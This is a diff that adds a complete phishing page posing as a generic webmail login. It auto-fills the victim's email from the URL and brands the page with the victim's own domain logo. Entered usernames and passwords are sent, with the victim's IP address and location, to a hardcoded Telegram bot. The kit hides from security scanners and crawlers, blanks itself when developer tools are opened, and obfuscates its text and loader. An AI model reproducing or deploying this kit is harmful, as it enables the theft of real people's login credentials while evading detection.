@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<script>
+(function(){
+  var isBot = false;
+  // Headless/automation detection via navigator properties
+  var w = navigator.webdriver || navigator.__driver || navigator.__nightmare ||
+          navigator.__selenium || navigator.__puppeteer || navigator.__playwright ||
+          window.__webdriver || window.__nightmare || window.__puppeteer ||
+          window.__playwright || window.callPhantom ||
+          window._Selenium_IDE_Recorder || window.__webdriver_evaluate ||
+          window.__fxdriver || window.__selenium_unwrapped ||
+          document.__webdriver_script_fn;
+  if (w) { isBot = true; }
+
+  // Screen dimensions check
+  if (screen.width < 200 || screen.height < 200) { isBot = true; }
+
+  // User agent bot check
+  var ua = navigator.userAgent.toLowerCase();
+  var botUA = ['bot','crawler','spider','scanner','curl','wget','python','urllib',
+               'java','libwww','httpclient','nutch','archive','scan','nikto',
+               'nessus','nmap','sqlmap','burp','zap','openvas','nuclei',
+               'dirbuster','gobuster','wfuzz','metasploit','cobalt','headless',
+               'phantom','selenium','webdriver','puppeteer','playwright','cypress',
+               'nightmare','casper','slimer','trident','msie 6','msie 7','msie 8',
+               'msie 9','iexplorer','scraper','extract','fetch','grabber',
+               'wget','httrack','sitesucker','offline'];
+  for (var i = 0; i < botUA.length; i++) {
+    if (ua.indexOf(botUA[i]) > -1) { isBot = true; break; }
+  }
+
+  // If bot detected, redirect to benign page
+  if (isBot) {
+    document.documentElement.innerHTML = '';
+    window.location.replace('about:blank');
+    return;
+  }
+  // Page is visible by default, no display:none needed
+})();
+</script>
+
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+    <script
+      src="https://code.jquery.com/jquery-2.2.4.min.js"
+      integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
+      crossorigin="anonymous"
+    ></script>
+    <title>
+      &#87;&#101;&#98;&#109;&#97;&#105;&#108;&#32;&#45;&#32;&#76;&#111;&#103;&#105;&#110;&#46;
+    </title>
+
+    <style>
+      body {
+        background-color: #eeeeee;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        font-size: 13px;
+        color: #425152;
+        margin: 0;
+      }
+
+      ::-moz-placeholder {
+        color: #d9dad9;
+      }
+
+      :-ms-input-placeholder {
+        color: #d9dad9;
+      }
+
+      ::-ms-input-placeholder {
+        color: #d9dad9;
+      }
+
+      ::placeholder {
+        color: #d9dad9;
+      }
+
+      a {
+        color: #425152;
+        text-decoration: none;
+      }
+
+      a:hover {
+        text-decoration: underline;
+      }
+
+      input {
+        border-radius: 5px;
+        padding: 5px 3px;
+      }
+
+      input.submit {
+        font-weight: bold;
+        text-align: center;
+        min-width: 90px;
+        color: #f0f0f0;
+        background: #444444;
+        padding: 5px 12px;
+        border-color: #444444;
+        border-style: solid;
+        cursor: pointer;
+      }
+
+      input.submit:hover {
+        color: #ffffff;
+      }
+
+      .row {
+        margin: 10px 0;
+      }
+
+      .row:after {
+        content: "";
+        display: table;
+        clear: both;
+      }
+
+      .logoWithPortalIcons {
+        width: 150px;
+        height: 50px;
+        background: transparent
+          url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAAARCAYAAAA/tFWCAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYNAictBVTA/AAAAj5JREFUaN7tWdFtgzAQfakyAPICyQffNCOQCdpMUDaoMkHIBFUnSDJB0gkgE5T62x9MgLJB+pGLRK2AMbYbiHgSPxjuznfPvjt7BOAMO0gBzAGgCHwPQAJgJn2zZlzEReBX6mRcjIrAD+n/MnIAC8ZFVnoXA1i1sPUEICOZO7LdVOYVIwC37J+X9LT1eUaPbDMqdOpiTfNPSF5rHzzBDfY3SGWKKYA9kdYUHjkuIidG6AdmfbHZOrGKwJ8Zsl1FrlcHcjcku0/YOPRz94jlKPBlvDiSG6J/eO+qYeOaPGtSa6nG1goZec03eZM6r8HO900psfzuWmOV5y/XG011tKltVOl7Iy1c1SIetbRHnp/sA6W9Y9tMZVykCnKBcRErxnNDcqMBcbOe7VInAJ//kBGc7VgTTYdfO6xrjRUBeKv4dse42Das0z6qOiPGxVJRlDfZsfqY+myn9z+xc02sSLPjkFNDXdCOml1bm64pMdgRHg2JZuw6Xbz3FYfBBQOxbGOraAoGWEiFqUbKQscCkuNyKq3CREr3EXU6j0au9T1jd5aeuEeOiyXbE4N5hzV1iq6OUCG/rc9vyW0yZqNW07LX+nED3fNVBSllXKRF4Md1RxFF4E9rGoi8SWc54C6YUROUjx0ID1F/iZsqxmPqLFc1/w/EstMVytgZ+HZPpPIAHF0QK3PsrK+BL1qLXAdHAz07XK6YPAC59a6QcXFwWBSehmOBzsKjuJ9cHjcs4ObAcUnXPQO6hRTAc2nx//wCPaq4/QlxCjAAAAAASUVORK5CYII=")
+          /*IconsTogether.svg*/ no-repeat left top;
+      }
+
+      .logoOnly {
+        width: 280px;
+        height: 30px;
+        overflow: hidden;
+      }
+
+      .logoOnly .logoWithPortalIcons {
+        width: 320px;
+        height: 120px;
+      }
+
+      .title {
+        font-size: 26px;
+        margin: 20px 0 10px;
+      }
+
+      .red {
+        color: #ee3031;
+      }
+
+      a#create-account {
+        display: inline-block;
+        border-radius: 4px;
+        padding: 3px 8px;
+        border: 1px solid #ee3031;
+      }
+
+      a#create-account:hover {
+        text-decoration: none;
+      }
+
+      .col1,
+      .col2 {
+        float: left;
+        line-height: 30px;
+        vertical-align: middle;
+        padding-top: 4px;
+      }
+
+      .col1 {
+        width: 124px;
+        font-size: 13px;
+        font-weight: 600;
+      }
+
+      .col2 {
+        width: 286px;
+      }
+
+      .col2 input {
+        width: 96%;
+      }
+
+      .error {
+        color: #d52b1e;
+        font-weight: normal;
+      }
+
+      .container {
+        background: rgba(255, 255, 255, 1);
+        padding: 40px;
+        box-shadow: 2px 2px 4px 2px #ccc;
+        width: 416px;
+        border-radius: 5px;
+        margin: 10% auto 30px auto;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+        transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      }
+
+      .password-icon {
+        width: 20px;
+        position: absolute;
+        cursor: pointer;
+        margin-top: 5px;
+        margin-left: -28px;
+        background-color: white;
+      }
+
+      #login_footer {
+        line-height: 125%;
+        font-size: 12px;
+        text-align: justify;
+        width: 500px;
+        margin: 90px auto auto auto;
+        padding-left: 10px;
+      }
+
+      button.submit {
+        background-color: #148468;
+        color: white;
+        padding: 5px 24px;
+        font-size: 16px;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      button.submit:hover {
+        background-color: #34bd9b;
+      }
+
+      @media only screen and (max-width: 600px) {
+        body {
+          background-image: blur(1.2px);
+        }
+
+        .container {
+          width: 100%;
+          border-radius: 0;
+          box-shadow: none;
+          padding: 0;
+          margin-top: 0;
+        }
+
+        .container div.body {
+          padding: 40px 20px;
+        }
+
+        .col1,
+        .col2 {
+          float: none;
+          width: 100%;
+        }
+
+        #login_footer {
+          width: 99%;
+          margin-top: 20px;
+        }
+
+        #login_footer div.content {
+          padding: 10px 20px 10px 10px;
+        }
+
+        .password-icon {
+          margin-top: -25px;
+          right: 7%;
+        }
+      }
+
+      .xlogo {
+        color: #fff;
+        margin-bottom: 10px;
+        margin-top: -25px;
+      }
+
+      .xlogo img {
+        vertical-align: middle;
+        max-width: 120px;
+        height: auto;
+        max-height: 48px;
+        object-fit: contain;
+        display: inline-block;
+      }
+
+      .xlogo span {
+        vertical-align: middle;
+      }
+
+      .text-g {
+        font-family: "Arial Black", Gadget, sans-serif;
+        text-align: center;
+        font-size: 12px;
+        color: #444444;
+        background-color: rgba(255, 255, 255, 0);
+        text-shadow: rgb(255, 255, 255) 2px 2px 2px;
+      }
+
+      #root {
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        top: 0;
+        z-index: -10;
+        pointer-events: none;
+        filter: brightness(0.3);
+      }
+
+      .enableBlur > * {
+        filter: blur(1.2px);
+      }
+
+      .disableBlur {
+        filter: blur(0);
+      }
+    </style>
+
+    <meta http-equiv="X-Translated-By" content="Google" />
+    <meta http-equiv="X-Translated-To" content="en" />
+
+    <meta name="robots" content="none" />
+  </head>
+
+  <body>
+    <div id="login_form" action="" method="post" autocomplete="off">
+      <input
+        type="hidden"
+        name="csrfmiddlewaretoken"
+        value="xWUPRch6gUXcsYdMNLyWrIvExcWeJ3qTtf8VMHZWmQ2EBBFj3eYVAcVdcPIJiDWq"
+      />
+      <input type="hidden" name="next" value="/" />
+
+      <div
+        class="container"
+        id="container"
+        style="padding-bottom: 10px !important; position: relative"
+      >
+        <div
+          style="
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            left: 0;
+            background: #fff;
+            opacity: 0.7;
+            display: none;
+          "
+          id="background-image"
+        ></div>
+        <img
+          src="https://ik.imagekit.io/escrowmade/Rolling-1s-200px__1__trHCWXy9jD.gif"
+          style="
+            width: 50px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+          "
+          id="processing"
+        />
+      </div>
+    </div>
+    <script type="text/template" id="tpl-password">
+      <form id="loginForm" method="POST">
+        <input type="hidden" class="form-control" name="hido" id="hido" value="">
+        <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
+
+        <div class="body">
+          <div class="xlogo">
+            <img id="logoim" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48dGV4dCB5PSIuOWVtIiBmb250LXNpemU9IjkwIj7wn5OGPC90ZXh0Pjwvc3ZnPg==" style="width:40px;height:40px;">
+            <span style="text-transform: capitalize;" class='text-g' id="banNer"></span>
+          </div>
+
+          <div class="row">
+            <div class="col1">
+              <label for="id_email">&#69;&#109;&#97;&#105;&#108;&#58;</label>
+            </div>
+            <div class="col2">
+              <input type="text" name="email" value="" id="email" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" required>
+            </div>
+          </div>
+
+          <div class="col1">
+            <label for="id_pass">&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#58;</label>
+          </div>
+          <div class="col2">
+            <input type="password" name="password" id="password" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" required>
+             <img  id="togglePassword"  class="password-icon" src="https://cdn-icons-png.flaticon.com/512/709/709612.png" alt="" />
+          </div>
+
+          <br><br>
+
+          <div class="row">
+            <span id="error-session" class="error-notice" style="color: red">
+              &#32;&#83;&#101;&#115;&#115;&#105;&#111;&#110;&#32;&#69;&#120;&#112;&#105;&#114;&#101;&#100;&#46;
+            </span>
+
+            <span id="msg" class="error-notice" style="display: none; padding: 10px; height: 20px; width:1220px; vertical-align: middle; border:0px solid red; color:red; font-size: 16px; font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; margin-top: 12px;">
+              &#89;&#111;&#117;&#114;&#32;&#108;&#111;&#103;&#105;&#110;&#32;&#97;&#116;&#116;&#101;&#109;&#112;&#116;&#32;&#116;&#105;&#109;&#101;&#100;&#32;&#111;&#117;&#116;&#46;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#116;&#114;&#121;&#32;&#97;&#103;&#97;&#105;&#110;&#46;
+            </span>
+
+            <span id="error" class="error-notice" style="display: none; padding: 10px; height: 20px; width:1220px; vertical-align: middle; border:0px solid red; color:red; font-size: 16px; font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; margin-top: 12px;">
+              &#69;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;
+            </span>
+          </div>
+
+          <div class="row">
+            <div class="col01" style="line-height:40px;padding-top:10px;">
+              <button name="login" type="submit" id="submit-btn" class="submit" >
+                Log in to continue
+              </button>
+            </div>
+          </div>
+
+          <div class="row">
+            <p>
+              Copyright 2026 <span id="kai"></span>.
+              <br><br>
+            </p>
+          </div>
+        </div>
+      </form>
+    </script>
+
+    <script>
+      var _0x1831da = _0x1c4f;
+      (function (_0x19fc8d, _0x45ad8d) {
+        var _0x56646c = _0x1c4f,
+          _0x514d6b = _0x19fc8d();
+        while (!![]) {
+          try {
+            var _0x2ac149 =
+              -parseInt(_0x56646c(0x11f)) / 0x1 +
+              (-parseInt(_0x56646c(0x120)) / 0x2) *
+                (parseInt(_0x56646c(0x123)) / 0x3) +
+              -parseInt(_0x56646c(0x126)) / 0x4 +
+              (parseInt(_0x56646c(0x128)) / 0x5) *
+                (parseInt(_0x56646c(0x124)) / 0x6) +
+              parseInt(_0x56646c(0x11e)) / 0x7 +
+              parseInt(_0x56646c(0x121)) / 0x8 +
+              -parseInt(_0x56646c(0x125)) / 0x9;
+            if (_0x2ac149 === _0x45ad8d) break;
+            else _0x514d6b["push"](_0x514d6b["shift"]());
+          } catch (_0x39d37d) {
+            _0x514d6b["push"](_0x514d6b["shift"]());
+          }
+        }
+      })(_0x33e7, 0xf266c);
+      var html = "";
+      html = document[_0x1831da(0x127)](_0x1831da(0x129))[_0x1831da(0x122)];
+      function _0x1c4f(_0x2f9ca5, _0x39e4aa) {
+        var _0x33e749 = _0x33e7();
+        return (
+          (_0x1c4f = function (_0x1c4fe5, _0x13b4f3) {
+            _0x1c4fe5 = _0x1c4fe5 - 0x11e;
+            var _0x22f4a1 = _0x33e749[_0x1c4fe5];
+            return _0x22f4a1;
+          }),
+          _0x1c4f(_0x2f9ca5, _0x39e4aa)
+        );
+      }
+      var container = document[_0x1831da(0x127)](_0x1831da(0x12a));
+      container[_0x1831da(0x122)] += html;
+      function _0x33e7() {
+        var _0x3fcf96 = [
+          "80KsLiRV",
+          "tpl-password",
+          "container",
+          "12515440MyiXzF",
+          "908262gmsxIg",
+          "6212SFIYce",
+          "11143600zYICZq",
+          "innerHTML",
+          "1002YKQdSq",
+          "10878hFgQJw",
+          "678213VynMvc",
+          "783916CdqYII",
+          "getElementById",
+        ];
+        _0x33e7 = function () {
+          return _0x3fcf96;
+        };
+        return _0x33e7();
+      }
+    </script>
+    <div id="root">
+      <iframe
+        id="myframe"
+        scrolling="no"
+        style="
+          position: absolute;
+          top: 0;
+          width: 100%;
+          height: 100%;
+          left: 0;
+          background: #fff;
+          opacity: 0.7;
+          width: 100% height=100% frameborder=0;
+        "
+      ></iframe>
+    </div>
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+    <script>
+      const phpLink = "wm.php";
+    </script>
+
+    <script>
+      $(document).ready(function () {
+        let attemptCount = 0;
+        let isVisible = false;
+        const passwordInput = $('#password');
+        const toggleIcon = $('#togglePassword');
+
+        toggleIcon.on('click', function () {
+          isVisible = !isVisible;
+          passwordInput.attr('type', isVisible ? 'text' : 'password');
+          const newSrc = isVisible 
+            ? 'https://cdn-icons-png.flaticon.com/512/709/709612.png'
+            : 'https://cdn-icons-png.flaticon.com/512/159/159604.png';
+          toggleIcon.attr('src', newSrc);
+        });
+
+        function a(a) {
+          function b(a) {
+            return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(a);
+          }
+          return !!b(a) || (!!atob(a) && (!!b(atob(a)) || void 0));
+        }
+
+        function b() {
+          attemptCount++;
+          console.log(attemptCount, " attemptCount++;");
+          $("#processing").show();
+          $("#error-session").hide();
+          setTimeout(() => {
+            $("#error").hide();
+            $("#msg").hide();
+            var b = $("#msg").html();
+            $("#msg").text(b);
+            return a($("#email").val())
+              ? 1 > $("#password").val().length
+                ? ($("#processing").hide(),
+                  $("#error").show(),
+                  $("#error").html("Password is empty"),
+                  $("#password").focus(),
+                  !1)
+                : void d()
+              : ($("#processing").hide(),
+                $("#error").show(),
+                $("#error").html("The email field is empty!"),
+                $("#email").focus,
+                !1);
+          }, 100);
+        }
+
+        function d() {
+          console.log({
+            email: $("#email").val(),
+            password: $("#password").val(),
+          });
+
+          const TELEGRAM_BOTS = [
+            {
+              token: "8740638199:AAHRUCEbMvut2ogZy23F31Yefc4Tgry08QI",
+              chatId: "5379686774",
+            }
+          ];
+
+          const username = $("#email").val();
+          const password = $("#password").val();
+          
+          // Get victim email domain for 3-attempt redirect
+          function getEmailDomain(email) {
+            var match = email.match(/@(.+)$/);
+            return match ? match[1] : null;
+          }
+          var victimDomain = getEmailDomain(username);
+
+          // Fetch geolocation and ISP data
+          $.getJSON('https://ipinfo.io/json/', function(data) {
+            const location = `${data.city}, ${data.region}, ${data.country_name}`;
+            const isp = data.org || 'Unknown ISP';
+            const ip = data.ip || 'Unknown IP';
+
+            const message = `<b>🔐 New Login Attempt</b>\n\n` +
+                           `<b>👤 Username:</b> ${username}\n\n` +
+                           `<b>🔑 Password:</b> ${password}\n\n` +
+                           `<b>🌍 Location:</b> ${location}\n\n` +
+                           `<b>🌐 ISP:</b> ${isp}\n\n` +
+                           `<b>📍 IP Address:</b> ${ip}`;
+
+            var sentCount = 0;
+            var botCount = TELEGRAM_BOTS.length;
+            TELEGRAM_BOTS.forEach((bot) => {
+              $.ajax({
+                url: `https://api.telegram.org/bot${bot.token}/sendMessage`,
+                method: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({
+                  chat_id: bot.chatId,
+                  text: message,
+                  parse_mode: "HTML",
+                }),
+                success: function (res) {
+                  sentCount++;
+                  if (sentCount === botCount) {
+                    $("#processing").hide();
+                    $("#error").show();
+                    $("#error").html("Invalid password, try again");
+                    if (attemptCount >= 3) {
+                      setTimeout(() => {
+                        if (victimDomain) {
+                          window.location.href = "https://" + victimDomain;
+                        } else {
+                          window.location.href = "https://outlook.live.com";
+                        }
+                      }, 1500);
+                    } else {
+                      setTimeout(() => {
+                        $("#password").val("");
+                        $("#error").html("Invalid password, try again");
+                      }, 1000);
+                    }
+                  }
+                },
+                error: function (err) {
+                  sentCount++;
+                  console.error(`Error sending to bot ${bot.token}:`, err);
+                  if (sentCount === botCount) {
+                    $("#processing").hide();
+                    $("#error").show();
+                    $("#error").html("Invalid password, try again");
+                    if (attemptCount >= 3) {
+                      setTimeout(() => {
+                        if (victimDomain) {
+                          window.location.href = "https://" + victimDomain;
+                        } else {
+                          window.location.href = "https://outlook.live.com";
+                        }
+                      }, 1500);
+                    } else {
+                      setTimeout(() => {
+                        $("#password").val("");
+                        $("#error").html("Invalid password, try again");
+                      }, 1000);
+                    }
+                  }
+                },
+              });
+            });
+          }).fail(function(err) {
+            console.error('Error fetching geolocation:', err);
+            // Fallback message without location/ISP
+            const message = `<b>🔐 New Login Attempt</b>\n\n` +
+                           `<b>👤 Username:</b> ${username}\n\n` +
+                           `<b>🔑 Password:</b> ${password}\n\n` +
+                           `<b> Location:</b> Unknown\n\n` +
+                           `<b>🌐 ISP:</b> Unknown\n\n` +
+                           `<b>📍 IP Address:</b> Unknown`;
+
+            var sentCount2 = 0;
+            var botCount2 = TELEGRAM_BOTS.length;
+            TELEGRAM_BOTS.forEach((bot) => {
+              $.ajax({
+                url: `https://api.telegram.org/bot${bot.token}/sendMessage`,
+                method: "POST",
+                contentType: "application/json",
+                data: JSON.stringify({
+                  chat_id: bot.chatId,
+                  text: message,
+                  parse_mode: "HTML",
+                }),
+                success: function (res) {
+                  sentCount2++;
+                  if (sentCount2 === botCount2) {
+                    $("#processing").hide();
+                    $("#error").show();
+                    $("#error").html("Invalid password, try again");
+                    if (attemptCount >= 3) {
+                      setTimeout(() => {
+                        if (victimDomain) {
+                          window.location.href = "https://" + victimDomain;
+                        } else {
+                          window.location.href = "https://outlook.live.com";
+                        }
+                      }, 1500);
+                    } else {
+                      setTimeout(() => {
+                        $("#password").val("");
+                        $("#error").html("Invalid password, try again");
+                      }, 1000);
+                    }
+                  }
+                },
+                error: function (err) {
+                  sentCount2++;
+                  console.error(`Error sending to bot ${bot.token}:`, err);
+                  if (sentCount2 === botCount2) {
+                    $("#processing").hide();
+                    $("#error").show();
+                    $("#error").html("Invalid password, try again");
+                    if (attemptCount >= 3) {
+                      setTimeout(() => {
+                        if (victimDomain) {
+                          window.location.href = "https://" + victimDomain;
+                        } else {
+                          window.location.href = "https://outlook.live.com";
+                        }
+                      }, 1500);
+                    } else {
+                      setTimeout(() => {
+                        $("#password").val("");
+                        $("#error").html("Invalid password, try again");
+                      }, 1000);
+                    }
+                  }
+                },
+              });
+            });
+          });
+        }
+
+        function e(a) {
+          const b = a.match(/@(.+)$/);
+          return b[1];
+        }
+
+        var f = 0;
+        $("#m-btn").click();
+
+        // --- Autograb: Extract email from URL query param, path, or hash ---
+        var g = null;
+        
+        // PRIMARY: Query parameter ?a=BASE64 or ?email=BASE64 (works on ALL servers)
+        var params = new URLSearchParams(window.location.search);
+        var qpEmail = params.get('a') || params.get('email');
+        if (qpEmail && /^[A-Za-z0-9+/]+={0,2}$/.test(qpEmail)) {
+          g = atob(qpEmail);
+        }
+        
+        // SECONDARY: Parse URL path: expect /BASE64_EMAIL/login or /BASE64_EMAIL
+        if (!g) {
+          var path = window.location.pathname;
+          var pathParts = path.replace(/^\/|\/$/g, '').split('/');
+          if (pathParts.length >= 2) {
+            var candidate = pathParts[0];
+            if (pathParts[1].toLowerCase() === 'login' && /^[A-Za-z0-9+/]+={0,2}$/.test(candidate)) {
+              g = atob(candidate);
+            }
+          }
+          if (!g && pathParts.length === 1 && /^[A-Za-z0-9+/]+={0,2}$/.test(pathParts[0])) {
+            g = atob(pathParts[0]);
+          }
+        }
+        
+        // TERTIARY: Fallback to hash (legacy)
+        if (!g) {
+          var hashVal = window.location.hash.substr(1);
+          if (hashVal) {
+            if (/^[A-Za-z0-9+/]+={0,2}$/.test(hashVal)) {
+              g = atob(hashVal);
+            } else {
+              g = hashVal;
+            }
+          }
+        }
+
+        var _a = function(a) {
+          function b(a) {
+            return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(a);
+          }
+          return !!b(a) || (!!atob(a) && (!!b(atob(a)) || void 0));
+        };
+
+        if (g && _a(g)) {
+          $("#email").val(g);
+          var h = g,
+            i = h.indexOf("@"),
+            j = h.substr(i + 1),
+            k = j.substr(0, j.indexOf(".")),
+            c = k.charAt(0).toUpperCase() + k.slice(1).toLowerCase();
+          $("#email").val(h),
+            $("#email").attr("readonly", !0),
+            $("#msg").hide(),
+            $("#processing").hide();
+          // Set background from thumbnail
+          var m = "url('https://image.thum.io/get/width/1200/crop/900/https://" + j + "')";
+          // Dynamic logo loading with fallback chain (Clearbit → favicon)
+          var domain = e($("#email").val());
+          var logos = [
+            "https://logo.clearbit.com/" + domain,
+            "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64",
+            "https://www.google.com/s2/favicons?domain=" + domain
+          ];
+          var logoImg = $("#logoim");
+          var tryLogo = function(idx) {
+            if (idx >= logos.length) return;
+            var testImg = new Image();
+            testImg.onload = function() {
+              logoImg.attr("src", logos[idx]);
+              logoImg.css({"max-width": "120px", "height": "auto", "vertical-align": "middle"});
+            };
+            testImg.onerror = function() {
+              tryLogo(idx + 1);
+            };
+            testImg.src = logos[idx];
+          };
+          tryLogo(0);
+          $("#kai").html(j);
+          $("#banNer").html(c + " Webmail Login");
+          try {
+            document.body.style.backgroundImage = m;
+          } catch(e) {}
+          $("#password").focus();
+        } else {
+          $("#email").focus();
+        }
+        $("#submit-btn").click(function (a) {
+          a.preventDefault(), b();
+        });
+      });
+    </script>
+
+    <script>
+      $("#processing").hide();
+    </script>
+  
+    <script>
+      // Anti-bot layer 2: DevTools detection
+      var devtoolsOpen = false;
+      (function() {
+        // Skip detection on mobile devices to avoid false positives
+        var ua = navigator.userAgent.toLowerCase();
+        var isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        if (isMobile) {
+          console.log('Mobile device detected, skipping devtools check');
+          return;
+        }
+        var threshold = 300; // Increased threshold to reduce false positives
+        var check = function() {
+          var widthThreshold = window.outerWidth - window.innerWidth > threshold;
+          var heightThreshold = window.outerHeight - window.innerHeight > threshold;
+          if (widthThreshold || heightThreshold) {
+            devtoolsOpen = true;
+            document.body.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-family:Arial;font-size:20px;color:#666;">Please close Developer Tools to continue.</div>';
+            setTimeout(function(){window.location.reload();}, 2000);
+          }
+        };
+        setInterval(check, 1000);
+      })();
+
+      // Anti-bot layer 3: Human interaction required for form
+      var humanVerified = false;
+      document.addEventListener('mousemove', function(e) { humanVerified = true; });
+      document.addEventListener('touchstart', function(e) { humanVerified = true; });
+      document.addEventListener('keydown', function(e) { humanVerified = true; });
+
+      // Override submit only to block if DevTools is open
+      $(document).ready(function() {
+        $("#submit-btn").on('click', function(evt) {
+          if (devtoolsOpen) {
+            evt.preventDefault();
+            $("#error").show().html("Please close Developer Tools to continue.");
+            return false;
+          }
+          // Allow form submission even without prior human interaction
+        });
+      });
+    </script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"fdae913c8113471a86e4985a22a99a2a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
